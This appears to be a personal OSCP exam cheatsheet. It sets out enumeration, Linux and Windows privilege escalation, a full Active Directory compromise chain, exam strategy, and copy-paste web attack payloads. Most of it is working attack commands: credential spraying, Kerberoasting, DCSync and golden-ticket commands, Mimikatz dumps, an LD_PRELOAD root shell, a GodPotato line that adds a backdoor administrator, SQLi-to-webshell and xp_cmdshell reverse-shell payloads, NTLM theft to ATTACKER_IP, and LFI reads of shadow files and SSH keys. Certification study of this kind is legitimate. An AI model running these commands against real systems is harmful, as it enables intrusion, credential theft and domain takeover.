**IDENT (113, 10000/tcp):** `ident-user-enum -M ALL -I $IP -p 113` -> try username as SSH password

**Mouse/RemoteMouse (1978, 9099/tcp):** `searchsploit remotemouse` -> modify for rev shell. LPE via tray icon.

**SQUID Proxy (3128/tcp):** `curl --proxy http://$IP:3128 http://127.0.0.1:8080` -> pivot to internal services

**WSD/API (5357/tcp):** Often vulnerable to MS09-050. Check SMB version + OS.

**VNC (5800, 5900/tcp):** `vncviewer $IP::5901` -> crack ~/.vnc/passwd with vncpwd

**NetBIOS (139/tcp):** `nbtscan $IP` + `enum4linux -p 139 -a $IP`

#### □ IF port 8080/8443/8000 (Alt HTTP) is open:
```
□ Treat same as port 80 — full web enumeration
□ Common: Jenkins, Tomcat, custom apps, APIs
□ Jenkins: check /script for Groovy console (Jeeves, Builder)
```

### PHASE 2 — INITIAL FOOTHOLD

```
□ By now you should have:
    - Full port/service inventory
    - Web technologies identified
    - Potential usernames collected
    - Potential attack vectors listed

□ PRIORITIZE attacks:
    1. Known CVE for exact version → searchsploit, Google "software version exploit"
    2. Default/guessable credentials on any service
    3. File upload → webshell
    4. SQL injection → creds or RCE
    5. LFI/RFI → source code, config files, log poisoning
    6. Command injection in web parameters
    7. Password reuse from one service to another

□ BEFORE running exploits:
    - Modify IP/port in exploit code
    - Set up listener:  nc -lvnp PORT  or  rlwrap nc -lvnp PORT
    - If exploit needs specific language runtime → verify it's available

□ Got a shell? IMMEDIATELY:
    - Upgrade shell (python3 -c 'import pty; pty.spawn("/bin/bash")')
    - cat local.txt or user.txt → SCREENSHOT with whoami, hostname, ip addr
    - Start privesc enumeration
```

### PHASE 3 — PRIVILEGE ESCALATION (Linux)

```
□ QUICK WINS (check these FIRST, <5 min):
    □ sudo -l                                    → GTFOBins for ANY binary listed
    □ find / -perm -4000 -type f 2>/dev/null     → Check SUID binaries on GTFOBins
    □ cat /etc/crontab && ls -la /etc/cron.*     → Writable cron scripts?
    □ id                                         → In docker/lxd group?
    □ ls -la /home/*/.ssh/                       → SSH keys for other users?
    □ cat /var/www/html/*.php | grep -i pass     → DB creds in web configs?
    □ history                                    → Previous commands with creds?

□ IF sudo -l shows ANYTHING:
    → Check GTFOBins.github.io for that binary
    → Check if you can set env vars (LD_PRELOAD, LD_LIBRARY_PATH)
    → If "env_keep+=LD_PRELOAD":
        // Compile: gcc -fPIC -shared -o evil.so evil.c -nostartfiles
        // evil.c: void _init() { setuid(0); system("/bin/bash"); }
        sudo LD_PRELOAD=/tmp/evil.so <allowed_binary>

□ IF SUID binary found:
    → Known binary? → GTFOBins
    → Custom binary? → strings <binary>, ltrace <binary>, strace <binary>
    → Does it call other commands without full path? → PATH hijack
    → Does it read/write files? → symlink attack

□ IF interesting cron/timer found:
    → Is the script writable? → Inject reverse shell
    → Does it use wildcards (tar *, rsync *)? → Wildcard injection
    → Does it execute from writable directory? → Replace script/binary
    → Not sure about crons? → Upload and run pspy64

□ IF writable /etc/passwd:
    → openssl passwd -1 hacker → paste into /etc/passwd as root entry

□ IF in docker/lxd group:
    → Docker: docker run -v /:/mnt --rm -it alpine chroot /mnt sh
    → LXD: Import alpine, mount host filesystem (see LXD section above)

□ IF you found database creds:
    → Connect and dump user tables → crack hashes → try SSH with cracked passwords

□ IF internal services running (ss -tlnp):
    → Port forward: ssh -L LOCAL:127.0.0.1:REMOTE user@$IP  or  chisel
    → Enumerate the internal service same as external

□ IF nothing found → run full automated enum:
    □ linpeas.sh (upload and run)
    □ linux-exploit-suggester.sh
    □ Focus on: kernel version, capabilities (getcap -r / 2>/dev/null),
      writable paths in $PATH, config files with credentials
```

### PHASE 3 — PRIVILEGE ESCALATION (Windows)

```
□ QUICK WINS (check these FIRST):
    □ whoami /priv
        → SeImpersonatePrivilege? → PrintSpoofer/GodPotato/JuicyPotato
        → SeBackupPrivilege? → Copy SAM/SYSTEM or ntds.dit
        → SeRestorePrivilege? → Replace service binary
        → SeAssignPrimaryTokenPrivilege? → Potato attacks
    □ whoami /groups
        → Administrators? → You're already admin (UAC bypass if needed)
        → Backup Operators? → Backup SAM/SYSTEM
    □ cmdkey /list → If creds stored → runas /savecred /user:admin cmd
    □ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
        → AutoLogon passwords?

□ IF SeImpersonatePrivilege:
    → Modern (Server 2019+): PrintSpoofer64.exe -i -c cmd
    → Modern (all): GodPotato-NET4.exe -cmd "cmd /c reverse_shell"
    → Older (pre-2019): JuicyPotato.exe -l 1337 -p cmd.exe -a "..." -t * -c {CLSID}
    → Very old: RottenPotato

□ IF service misconfigurations:
    → Unquoted paths: wmic service get name,pathname | findstr /v """
    → Modifiable services: accesschk.exe -uwcqv "Everyone" *
    → Writable service binary: replace with reverse shell exe
    → Can change config: sc config <svc> binpath= "C:\path\reverse.exe"
    → Then: sc stop <svc> && sc start <svc>

□ IF AlwaysInstallElevated:
    → Check both HKLM and HKCU registry keys (both must = 1)
    → msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi
    → msiexec /quiet /qn /i evil.msi

□ IF DLL hijack opportunity:
    → Missing DLL in writable directory
    → Compile malicious DLL (see Windows Privesc section above)
    → Place in application directory → restart service/app

□ IF password hunting needed:
    □ dir /s /b C:\Users\*.txt C:\Users\*.ini C:\Users\*.cfg C:\Users\*.xml 2>nul
    □ findstr /si "password" *.txt *.ini *.cfg *.xml *.config
    □ Check PowerShell history: type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    □ Check IIS config: type C:\inetpub\wwwroot\web.config
    □ Check unattend files: type C:\Windows\Panther\Unattend.xml

□ IF internal services (netstat -ano):
    → Forward port: chisel or SSH or plink
    → Common: MSSQL (1433), MySQL (3306), internal web apps

□ IF nothing found → run automated tools:
    □ winPEASx64.exe
    □ PowerUp.ps1: powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
    □ Seatbelt.exe (for more context)
    □ windows-exploit-suggester (from attacker, using systeminfo output)
```

### PHASE 4 — PROOF & DOCUMENTATION

```
□ GOT ROOT/SYSTEM:
    □ SCREENSHOT proof.txt with hostname and IP:
        Linux:  cat /root/proof.txt && whoami && hostname && ip addr show
        Windows: type C:\Users\Administrator\Desktop\proof.txt && whoami && hostname && ipconfig
    □ SCREENSHOT the local.txt/user.txt proof too if not already done
    □ Note the FULL attack path: enum → foothold → privesc
    □ Make sure your report notes are complete before moving to next machine
```

---

## 🔲 ACTIVE DIRECTORY SET — FULL ATTACK CHAIN CHECKLIST

> **This is worth 40 POINTS (all-or-nothing on DC compromise).**
> **Typical flow: Machine 1 → Credentials → Machine 2 → Credentials → Domain Controller**
> **Time budget: ~3-4 hours for the full chain**

### AD PHASE 0 — INITIAL RECON (First 15 Minutes)

```
□ Run autorecon on ALL 3 AD machines simultaneously
□ Identify which machine is the DC:
    - Port 88 (Kerberos) + 389 (LDAP) + 636 + 53 (DNS) = Domain Controller
    - The DC is usually the LAST machine you fully compromise
□ Add domain name to /etc/hosts:  echo "$DC_IP domain.local dc.domain.local" >> /etc/hosts
□ Also add the other machine hostnames if discovered
□ Identify your entry point — which non-DC machine has the most attack surface?
```

### AD PHASE 1 — NO CREDENTIALS (Unauthenticated Enumeration)

```
□ ANONYMOUS/NULL SESSION ENUMERATION:
    □ SMB null session:
        smbclient -L //$IP -N
        smbmap -H $IP
        smbmap -H $IP -u '' -p ''
        crackmapexec smb $IP -u '' -p '' --shares
        crackmapexec smb $IP -u 'guest' -p '' --shares
    □ LDAP anonymous bind:
        ldapsearch -x -H ldap://$DC_IP -b "DC=domain,DC=local"
        ldapsearch -x -H ldap://$DC_IP -b "DC=domain,DC=local" '(objectClass=person)' sAMAccountName
    □ RPC null session:
        rpcclient -U '' -N $DC_IP
        > enumdomusers
        > enumdomgroups
        > querydispinfo
    □ enum4linux -a $DC_IP
    □ Kerbrute user enumeration:
        kerbrute userenum -d domain.local --dc $DC_IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

□ COLLECT USERNAMES FROM EVERYWHERE:
    □ SMB shares (user directories, files, documents)
    □ LDAP results
    □ Web applications on any of the 3 machines (about pages, contact forms)
    □ Email addresses found anywhere → derive username format
    □ SNMP if port 161 is open on any machine
    □ Generate permutations: first.last, f.last, flast, first_last

□ WEB SERVICES ON AD MACHINES:
    □ Treat any web service exactly like standalone (full web enum)
    □ Web apps on AD machines often give you first credentials
    □ Common: internal wikis, ticketing systems, file managers, custom apps
    □ These often have: default creds, SQLi, file upload, command injection
```

### AD PHASE 2 — GETTING FIRST CREDENTIALS

```
□ ATTEMPT THESE IN ORDER:

    1. □ Default/guessable creds on web applications
    2. □ AS-REP Roasting (if you have valid usernames):
         impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip $DC_IP -format hashcat
         hashcat -m 18200 hash.txt rockyou.txt
    3. □ Web application exploitation on entry-point machine
    4. □ Password = username spray:
         crackmapexec smb $DC_IP -u users.txt -p users.txt --no-bruteforce --continue-on-success
    5. □ Common password spray (BE CAREFUL of lockout):
         crackmapexec smb $DC_IP -u users.txt -p 'Welcome1' --continue-on-success
         # Common OSCP spray passwords: Welcome1, Password1, Season+Year, CompanyName1
    6. □ SNMP enumeration for cleartext creds
    7. □ SMB share contents (config files, scripts, documents)
    8. □ FTP anonymous access → credential files
    9. □ NTLM theft (responder + trigger via SSRF, SQL injection, etc.)
         sudo responder -I tun0
         # Then trigger from: SQL xp_dirtree, SSRF, file upload, etc.

□ GOT FIRST CREDS? → VALIDATE IMMEDIATELY:
    crackmapexec smb $DC_IP -u 'user' -p 'pass'
    crackmapexec winrm $IP -u 'user' -p 'pass'  # Check if can get shell
    crackmapexec smb $DC_IP -u 'user' -p 'pass' --shares  # What can we read now?
```

### AD PHASE 3 — AUTHENTICATED ENUMERATION (Critical Phase)

```
□ BLOODHOUND (DO THIS IMMEDIATELY WITH FIRST CREDS):
    bloodhound-python -u 'user' -p 'pass' -d domain.local -ns $DC_IP -c all
    # Start neo4j: sudo neo4j start
    # Open BloodHound GUI → Upload JSON files
    # Run these queries:
    □ "Find Shortest Paths to Domain Admins"
    □ "Find AS-REP Roastable Users"
    □ "Find Kerberoastable Users"
    □ "Find Principals with DCSync Rights"
    □ "Shortest Paths to High Value Targets"
    □ Check outbound rights for your compromised user

□ SMB SHARE DEEP DIVE:
    smbmap -H $DC_IP -u 'user' -p 'pass' -R  # Recursive listing of ALL shares
    # Download interesting shares:
    smbclient //$IP/share -U 'user%pass' -c 'recurse on; prompt off; mget *'
    # Look for:
    □ SYSVOL/Policies → GPP cpassword (gpp-decrypt)
    □ NETLOGON scripts → hardcoded creds
    □ Department shares → passwords in docs/spreadsheets
    □ IT shares → config files, scripts, backups
    □ Personal user shares → SSH keys, password files

□ LDAP DEEP DIVE:
    ldapsearch -x -H ldap://$DC_IP -D 'user@domain.local' -w 'pass' -b "DC=domain,DC=local" '(objectClass=person)' sAMAccountName description
    # Check description field for passwords (Cicada, Puppy used this)
    crackmapexec ldap $DC_IP -u user -p pass -M get-desc-users

□ KERBEROASTING:
    impacket-GetUserSPNs domain.local/user:pass -dc-ip $DC_IP -request
    hashcat -m 13100 tgs_hash.txt rockyou.txt
    # (Active machine: Administrator was Kerberoastable)

□ MORE AS-REP ROASTING (with full user list now):
    impacket-GetNPUsers domain.local/user:pass -dc-ip $DC_IP -request

□ CHECK GROUP MEMBERSHIPS:
    crackmapexec smb $DC_IP -u user -p pass --users
    crackmapexec smb $DC_IP -u user -p pass --groups
    # Important groups: Server Operators, Backup Operators, Account Operators,
    #   DnsAdmins, Remote Desktop Users, Remote Management Users
    # Also check: LAPS readers, Group Policy Creator Owners

□ CHECK LAPS:
    crackmapexec ldap $DC_IP -u user -p pass -M laps
    # (Timelapse, Hutch used LAPS)

□ CHECK ADCS (Certificate Services):
    certipy find -u user@domain.local -p 'pass' -dc-ip $DC_IP -vulnerable
    # Look for ESC1, ESC4, ESC8 (Escape used ESC1, Certified used ESC9)

□ VALIDATE CREDS AGAINST ALL MACHINES:
    crackmapexec smb $IP1 $IP2 $IP3 -u 'user' -p 'pass'
    crackmapexec winrm $IP1 $IP2 $IP3 -u 'user' -p 'pass'
    # Users often have access to multiple machines — check everywhere
```

### AD PHASE 4 — LATERAL MOVEMENT (Machine 1 → Machine 2)

```
□ WITH VALID CREDS, GET A SHELL ON NEXT MACHINE:
    # Try in this order:
    1. evil-winrm -i $IP -u user -p 'pass'           # WinRM (5985)
    2. impacket-psexec domain.local/user:pass@$IP      # PsExec (445, needs admin)
    3. impacket-wmiexec domain.local/user:pass@$IP     # WMI (135)
    4. xfreerdp /v:$IP /u:user /p:pass /cert-ignore    # RDP (3389)

□ ONCE ON NEW MACHINE — HARVEST MORE CREDS:
    □ Check for other logged-in users (qwinsta, query user)
    □ Dump local hashes:
        reg save hklm\sam C:\temp\SAM
        reg save hklm\system C:\temp\SYSTEM
        # Transfer to attacker → impacket-secretsdump -sam SAM -system SYSTEM LOCAL
    □ Search for passwords:
        findstr /si "password" *.txt *.ini *.config *.xml
        type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    □ Check for KeePass databases (.kdbx)
    □ Check for PFX/certificate files
    □ Check for database connection strings
    □ Mimikatz (if you have local admin):
        .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
    □ Run winPEAS for additional findings

□ ACL-BASED ATTACKS (from BloodHound):
    → GenericAll over user? → Change their password or set SPN for Kerberoasting
        Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)
    → GenericWrite over user? → Set SPN → Kerberoast, or write scriptpath
    → WriteDACL over domain? → Grant yourself DCSync rights (Forest)
    → ForceChangePassword? → rpcclient → setuserinfo2 (Blackfield)
    → AddMember on privileged group? → Add yourself to Domain Admins
    → ReadLAPSPassword? → Read local admin password
    → GenericAll/Write over computer? → RBCD attack (Resourced)
    → AllowedToDelegate? → Constrained delegation → impersonate admin

□ PASS-THE-HASH (if you have NTLM hashes but not plaintext):
    evil-winrm -i $IP -u user -H 'HASH'
    impacket-psexec -hashes :HASH domain.local/user@$IP
    crackmapexec smb $IP -u user -H HASH
```

### AD PHASE 5 — DOMAIN CONTROLLER COMPROMISE

```
□ METHODS TO COMPROMISE DC (try in order of likelihood):

    1. □ DCSync (if you have the right permissions):
         impacket-secretsdump domain.local/user:pass@$DC_IP
         impacket-secretsdump -hashes :HASH domain.local/user@$DC_IP
         # This gives you ALL domain hashes including Administrator

    2. □ ADCS Certificate Abuse (if vulnerable template found):
         certipy req -u user@domain.local -p 'pass' -ca 'CA' -template 'VulnTemplate' -upn administrator@domain.local
         certipy auth -pfx administrator.pfx -dc-ip $DC_IP

    3. □ Pass-the-Hash with Domain Admin hash:
         impacket-psexec -hashes :HASH domain.local/administrator@$DC_IP

    4. □ RBCD attack → impersonate admin → access DC

    5. □ Golden Ticket (if you have krbtgt hash from DCSync):
         impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain domain.local Administrator
         export KRB5CCNAME=Administrator.ccache
         impacket-psexec -k -no-pass domain.local/administrator@$DC_IP

    6. □ Backup Operator / SeBackupPrivilege → Copy ntds.dit:
         # Use diskshadow or wbadmin to backup ntds.dit
         # Then secretsdump to extract all hashes

    7. □ LAPS → get local admin password on DC

□ GOT DA/DC ACCESS:
    □ SCREENSHOT proof.txt on DC:
        type C:\Users\Administrator\Desktop\proof.txt && whoami && hostname && ipconfig
    □ Make sure you have proof.txt from ALL 3 AD machines
    □ All 3 required for the 40 points!
```

### AD PHASE — COMMON ATTACK CHAINS FROM LAINKUSANAGI MACHINES

```
Chain 1 (Forest-style):
  Null session → enumerate users → AS-REP Roast → creds
  → BloodHound → find WriteDACL path → grant DCSync → dump all hashes

Chain 2 (Active-style):
  SMB null session → SYSVOL → GPP cpassword decrypt
  → Kerberoast Administrator → crack TGS → psexec as admin

Chain 3 (Sauna-style):
  Website username enumeration → AS-REP Roast → crack hash → WinRM
  → Find AutoLogon creds in registry → pivot to service account → DCSync

Chain 4 (Monteverde-style):
  SMB user enum → password = username → access Azure AD Connect
  → Extract connector credentials → admin access

Chain 5 (Timelapse-style):
  SMB share → find ZIP with PFX cert → crack ZIP → crack PFX with john
  → WinRM with certificate → LAPS group → read local admin password

Chain 6 (Escape-style):
  SMB share → MSSQL creds → NTLM theft via xp_dirtree
  → Crack hash → cert abuse (ESC1) → administrator certificate → DC

Chain 7 (Blackfield-style):
  AS-REP Roast → BloodHound → ForceChangePassword on audit2020
  → Access forensic share → lsass dump → mimikatz extract hash
  → SeBackupPrivilege → copy ntds.dit → secretsdump

Chain 8 (Resourced-style):
  SMB creds → RBCD (Resource-Based Constrained Delegation)
  → Add fake computer → delegate → impersonate admin → DC

Chain 9 (Return-style):
  Printer admin page → change LDAP server to attacker → capture creds
  → Server Operators group → modify service binary path → SYSTEM

Chain 10 (Cicada-style):
  SMB guest → find password in HR share → spray → pivot through users
  → SeBackupPrivilege → dump SAM/SYSTEM → admin hash → DC
```

---

## Exam Day Quick Reference

### Point Distribution (Current OSCP+ Format)
- **Active Directory Set**: 40 points (3 machines, all-or-nothing on DC)
- **Standalone 1**: 20 points (10 user + 10 root)
- **Standalone 2**: 20 points (10 user + 10 root)
- **Standalone 3**: 20 points (10 user + 10 root)
- **Pass**: 70 points

### Exam Time Management Strategy

```
Hour 0-0.5:   Start autorecon on ALL 6 machines. Triage ports.
Hour 0.5-4:   AD set (40 pts). Enumerate all 3, find entry point, chain through.
Hour 4-4.5:   BREAK. Eat. Walk. Decompress.
Hour 4.5-7:   Standalone 1 (20 pts). Full methodology top to bottom.
Hour 7-9.5:   Standalone 2 (20 pts).
Hour 9.5-10:  BREAK.
Hour 10-12.5: Standalone 3 (20 pts).
Hour 12.5+:   Return to anything incomplete. Try different approaches.
              Run all automated tools you haven't tried yet.
              Re-read your notes with fresh eyes.
```

### Proof Commands
```bash
# Linux
cat /root/proof.txt && whoami && hostname && ip addr show
cat /home/<user>/local.txt && whoami && hostname && ip addr show

# Windows
type C:\Users\Administrator\Desktop\proof.txt && whoami && hostname && ipconfig
type C:\Users\<user>\Desktop\local.txt && whoami && hostname && ipconfig
```

### When You're STUCK (Anti-Rabbit-Hole Protocol)
```
□ Step back. Re-read your nmap output. Did you miss a port/service?
□ Re-run directory brute force with a DIFFERENT wordlist
□ Try DIFFERENT extensions (.php, .asp, .aspx, .jsp, .txt, .bak, .old, .zip)
□ Check ALL versions of ALL software against searchsploit AND Google
□ Try credentials you found EVERYWHERE (password reuse is king)
□ Check for virtual hosts / subdomains you missed
□ Read the actual web page content again — clues are often in plain sight
□ For AD: re-run BloodHound queries, check node info for EVERY user/computer
□ Run automated enum tools you haven't tried yet (linpeas/winpeas)
□ Move to another machine and come back with fresh eyes
```

---

> **Note to self**: Export your Notion notes as Markdown and upload them so I can merge your specific commands and findings into this document.
>
> **Tip**: This cheatsheet covers techniques from 100+ machines across HackTheBox, Proving Grounds Practice, and TryHackMe. On exam day, start with enumeration, identify the technology/service, then use this as a quick reference for the appropriate attack vector. Good luck, Justin! 🎯

---

## 🎯 EXAM DAY BATTLE PLAN — Intelligence from Recent Passers (2025-2026)

> **Compiled from 10+ recent OSCP+ pass reports. These are patterns from people who passed in the last 6 months.**

### The #1 Rule: AD Set = The Priority

**You MUST fully compromise the AD set to pass.** This is the consensus from every recent passer:
- AD set = 40 points (all-or-nothing on full DC compromise)
- Standalones are unpredictable — you can easily lose 20 points on a failed foothold
- **Minimum viable pass: 40 (AD) + 20 (one easy standalone) + 10 (user flag on another) = 70**
- You do NOT need to chase all 100 points

### Three Core Skills That Decide the Exam

From a Feb 2026 passer who went 30 → 80 points across 3 attempts:
1. **Credential harvesting** — Finding creds is THE game. Check descriptions, configs, history, shares
2. **Password and file cracking** — hashcat modes memorized, john2 converters ready
3. **Active Directory methodology** — Assumed breach flow burned into muscle memory

### The Credential Spray Habit

From multiple passers: **Every time you find ANY credential, spray it EVERYWHERE:**
```bash
# Check EVERY protocol with new creds immediately
nxc smb $IP1 $IP2 $IP3 -u 'newuser' -p 'newpass'
nxc winrm $IP1 $IP2 $IP3 -u 'newuser' -p 'newpass'
nxc rdp $IP1 $IP2 $IP3 -u 'newuser' -p 'newpass'
nxc mssql $IP1 $IP2 $IP3 -u 'newuser' -p 'newpass'
# Also spray against ALL domain users
nxc smb $DC -u users.txt -p 'newpass' --continue-on-success
```

### GodPotato — The Universal Potato

From a 2-month passer: "Don't get confused with many potatoes, stick with GodPotato, it's not gonna fail you ever."
```bash
# SeImpersonatePrivilege? → GodPotato every time
GodPotato-NET4.exe -cmd "cmd /c net user admin-support P@ssw0rd123 /add & net localgroup administrators admin-support /add"
```

### Three Categories of Attack Vectors (Mike's Framework)

Every OSCP vulnerability falls into one of three categories:
1. **Vulnerable Version** — Outdated software with known exploit (searchsploit, Google)
2. **Misconfiguration** — Anonymous access, weak permissions, default creds
3. **Sensitive Information** — Creds in configs, files, descriptions, history

The attack cycle: **Enumerate → Exploit → Get Creds → Spray → Lateral Move → Repeat**

### What You Will NOT See on the Exam
- OSINT / Google Dorking / DNS enumeration from scratch
- Network poisoning (LLMNR/NBT-NS — no Responder needed on standalones)
- Complex client-side attacks (no phishing required)
- Kernel exploits requiring compilation from source are rare

### Rabbit Hole Escape Protocol — The 30-Minute Rule
```
STUCK for 30 minutes on initial access?
  → Re-read ALL nmap output line by line
  → Re-run gobuster with DIFFERENT wordlist + extensions
  → Check for vhosts/subdomains you missed
  → Read the ACTUAL web page content — clues are in plain sight
  → Try credentials from OTHER machines (password reuse!)

STUCK for 30 minutes on privilege escalation?
  → Run automated tools you haven't tried (winpeas/linpeas)
  → Check internal services (netstat -ano / ss -tlnp)
  → Re-read config files with new user permissions
  → Search for database files, keepass databases, SSH keys
  → Check scheduled tasks / cron jobs more carefully

STUCK for 60+ minutes total on any single machine?
  → MOVE ON. Come back with fresh eyes later.
  → Work on a different machine — you'll often find creds that unlock the stuck one
```

### AD Set — Assumed Breach Quick Start (First 20 Minutes)
```bash
# You receive: username + password + IP of first AD host (MS01)
# Step 1: Validate and get shell
nxc smb $MS01 -u '$USER' -p '$PASS'
nxc winrm $MS01 -u '$USER' -p '$PASS'
evil-winrm -i $MS01 -u '$USER' -p '$PASS'
# OR
xfreerdp +clipboard /u:$USER /p:$PASS /v:$MS01 /dynamic-resolution /drive:shared,/home/kali/Windows

# Step 2: Immediately run BloodHound + enumerate
bloodhound-python -u '$USER' -p '$PASS' -d $DOMAIN -ns $DC -c all
# Upload JSON to BloodHound GUI → run key queries

# Step 3: Kerberoast + AS-REP while reviewing BloodHound
impacket-GetUserSPNs $DOMAIN/$USER:'$PASS' -dc-ip $DC -request
impacket-GetNPUsers $DOMAIN/$USER:'$PASS' -dc-ip $DC -request

# Step 4: Enumerate SMB shares (recursive!)
smbmap -H $DC -u '$USER' -p '$PASS' -d '$DOMAIN' -R
smbmap -H $MS01 -u '$USER' -p '$PASS' -d '$DOMAIN' -R

# Step 5: LDAP descriptions (password goldmine!)
nxc ldap $DC -u '$USER' -p '$PASS' -M get-desc-users

# Step 6: Local enumeration on MS01
whoami /priv
whoami /groups
# If SeImpersonatePrivilege → GodPotato for local admin
# Dump local secrets, hunt for more creds
```

### Report Writing — Do It AS YOU GO

**Critical: The report is what gets you certified, not the hacking.**
```
For EVERY flag captured, IMMEDIATELY document:
  1. Screenshot: proof.txt/local.txt + whoami + hostname + ipconfig/ip addr
  2. The vulnerability exploited (name, CVE if applicable)
  3. The exact steps to reproduce (every command)
  4. Include your scripts/PoCs as text inside the report

Report filename: OSCP-OS-XXXXX-Exam-Report.pdf → .7z (no password!)
```

### Timing Strategy (Updated for 23h45m Exam)

```
OPTION A — AD First (recommended if AD is your strength):
  Hour 0-1:     Setup. Nmap ALL machines. Start scans running.
  Hour 1-4:     AD set. Enumerate → foothold → lateral movement → DC.
  Hour 4-4.5:   BREAK. Walk. Eat. Reset.
  Hour 4.5-7:   Standalone 1.
  Hour 7-9.5:   Standalone 2.
  Hour 9.5-10:  BREAK.
  Hour 10-12.5: Standalone 3.
  Hour 12.5+:   Return to anything incomplete.

OPTION B — Start standalone, return to AD (if AD intimidates you):
  Hour 0-1:     Setup + nmap everything.
  Hour 1-3.5:   Easiest-looking standalone (build confidence).
  Hour 3.5-7:   AD set (with momentum from first win).
  Hour 7-7.5:   BREAK.
  Hour 7.5-10:  Standalone 2.
  Hour 10-12.5: Standalone 3.
  Hour 12.5+:   Return to anything incomplete.

OPTION C — Night owl (start at 10 PM):
  22:00-02:00:  AD set (focused, quiet).
  02:00-02:30:  BREAK.
  02:30-05:00:  Standalone 1.
  05:00-07:30:  Standalone 2.
  07:30-08:00:  BREAK + coffee.
  08:00-10:30:  Standalone 3.
  10:30+:       Return to anything incomplete.
```

### Technical Gotchas from Recent Exam-Takers
```
→ Chrome eats RAM after hours. Switch to Firefox if performance degrades.
→ VM connection drops: restart your VM, not just the VPN.
→ Exam setup takes ~30-60 minutes (webcam, scripts, VPN). Don't count this as hacking time.
→ Nmap is SLOW over VPN. Use --min-rate 3000 and run background scans.
→ File transfers are slow. Have multiple methods ready (certutil, wget, python http.server, SMB).
→ If something worked in Proving Grounds but fails on exam → try a different version of the tool.
→ Web shells are NOT valid for proof submission. Always convert to a proper reverse shell.
→ Metasploit is LIMITED to ONE target. Save it. Use manual exploits everywhere else.
→ DO NOT use AI/LLMs during the exam — this is a disqualification offense.
```

### Pre-Exam Night Checklist
```bash
# Kali VM ready:
□ Snapshots saved
□ VPN tested
□ Tools updated: sudo apt update && sudo apt upgrade
□ Wordlists present (rockyou, seclists)
□ Transfer files staged: /home/kali/Windows/ and /home/kali/Linux/
□ Reverse shells compiled: msfvenom payloads for win/linux x64
□ GodPotato, PrintSpoofer, mimikatz, winpeas, linpeas, chisel, ligolo all ready
□ Report template open and ready
□ Note-taking app open (CherryTree/Obsidian)
□ Snacks, water, caffeine prepared
□ Phone on DND
□ Sleep 8+ hours the night before
□ This cheatsheet open and searchable
```

---

## 🔪 WEB ATTACK QUICK REFERENCE — Copy-Paste Exam Ready

> **These are the exact patterns that show up on OSCP. Test every parameter.**

### SQLi Detection & Exploitation Flowchart

```
STEP 1 — DETECT (try each on every input field and URL parameter):
  '              ← Does it error? You have SQLi.
  ' OR 1=1-- -   ← Does it bypass login?
  ' OR 1=1#      ← MySQL variant
  admin'--       ← Comment out password check
  ' AND 1=1-- -  ← Boolean true (page normal)
  ' AND 1=2-- -  ← Boolean false (page different) → Blind SQLi
  ' AND sleep(3)-- -  ← Time delay? → Time-based blind SQLi
  ' AND IF(1=1,sleep(3),'false')-- //  ← MySQL time-based

STEP 2 — DETERMINE COLUMNS (UNION injection):
  ' ORDER BY 1-- -    ← Works
  ' ORDER BY 2-- -    ← Works
  ' ORDER BY 5-- -    ← Error! → Table has 4 columns
  ' UNION SELECT 1,2,3,4-- -   ← See which numbers display on page

STEP 3 — EXTRACT DATA:
  # MySQL
  ' UNION SELECT 1,version(),3,4-- -
  ' UNION SELECT 1,group_concat(schema_name),3,4 FROM information_schema.schemata-- -
  ' UNION SELECT 1,group_concat(table_name),3,4 FROM information_schema.tables WHERE table_schema=database()-- -
  ' UNION SELECT 1,group_concat(column_name),3,4 FROM information_schema.columns WHERE table_name='users'-- -
  ' UNION SELECT 1,group_concat(username,':',password),3,4 FROM users-- -

  # PostgreSQL
  ' UNION SELECT NULL,version(),NULL,NULL--
  ' UNION SELECT NULL,string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
  ' UNION SELECT NULL,string_agg(username||':'||password,','),NULL,NULL FROM users--

  # MSSQL
  ' UNION SELECT 1,@@version,3,4--
  ' UNION SELECT 1,name,3,4 FROM master..sysdatabases--
  ' UNION SELECT 1,name,3,4 FROM sysobjects WHERE xtype='U'--

STEP 4 — SQLi TO RCE:
  # MySQL → Write webshell
  ' UNION SELECT "<?php system($_GET['cmd']);?>",null,null,null INTO OUTFILE "/var/www/html/shell.php"-- -
  # Then: http://TARGET/shell.php?cmd=id

  # MSSQL → Enable xp_cmdshell
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  EXEC xp_cmdshell 'whoami';
  # Reverse shell:
  EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';

  # MSSQL → NTLM theft
  EXEC xp_dirtree '\\ATTACKER_IP\share';
  # Catch with: sudo responder -I tun0

  # SQLite
  ' UNION SELECT 1,group_concat(tbl_name),3 FROM sqlite_master WHERE type='table'--
  ' UNION SELECT 1,group_concat(password),3 FROM users--
```

### LFI → RCE Escalation Paths

```
STEP 1 — CONFIRM LFI:
  # Linux
  ?page=../../../../etc/passwd
  ?page=....//....//....//....//etc/passwd     ← If ../ is filtered
  ?file=..%2f..%2f..%2f..%2fetc/passwd          ← URL encoding bypass
  ?page=/etc/passwd                              ← Absolute path

  # Windows
  ?page=..\..\..\..\windows\system32\drivers\etc\hosts
  ?file=C:\windows\system32\drivers\etc\hosts

STEP 2 — READ VALUABLE FILES:
  # Linux
  /etc/passwd                    ← User enumeration
  /etc/shadow                    ← Password hashes (rare, need root perms)
  /home/USER/.ssh/id_rsa         ← SSH private key! (chmod 600 + ssh -i)
  /home/USER/.bash_history       ← May contain passwords
  /var/www/html/config.php       ← DB credentials
  /var/www/html/wp-config.php    ← WordPress DB creds
  /opt/*/config*                 ← App configs
  /proc/self/environ             ← Environment variables

  # Windows
  C:\inetpub\wwwroot\web.config         ← IIS creds
  C:\Windows\Panther\Unattend.xml       ← Setup passwords
  C:\Users\USER\.ssh\id_rsa             ← SSH key
